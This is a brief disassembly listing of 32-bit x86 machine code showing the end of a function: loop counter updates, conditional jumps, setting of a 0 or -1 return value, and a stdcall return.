  4078fc:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  407900:	0f 85 3f fe ff ff    	jne    0x407745
  407906:	ff 45 fc             	incl   -0x4(%ebp)
  407909:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  40790d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407910:	ff 45 d8             	incl   -0x28(%ebp)
  407913:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  407916:	0f 8e 1a fe ff ff    	jle    0x407736
  40791c:	33 c0                	xor    %eax,%eax
  40791e:	39 45 d0             	cmp    %eax,-0x30(%ebp)
  407921:	74 09                	je     0x40792c
  407923:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  407927:	74 03                	je     0x40792c
  407929:	83 c8 ff             	or     $0xffffffff,%eax
  40792c:	5f                   	pop    %edi
  40792d:	5e                   	pop    %esi
  40792e:	5b                   	pop    %ebx
  40792f:	c9                   	leave
  407930:	c2 24 00             	ret    $0x24
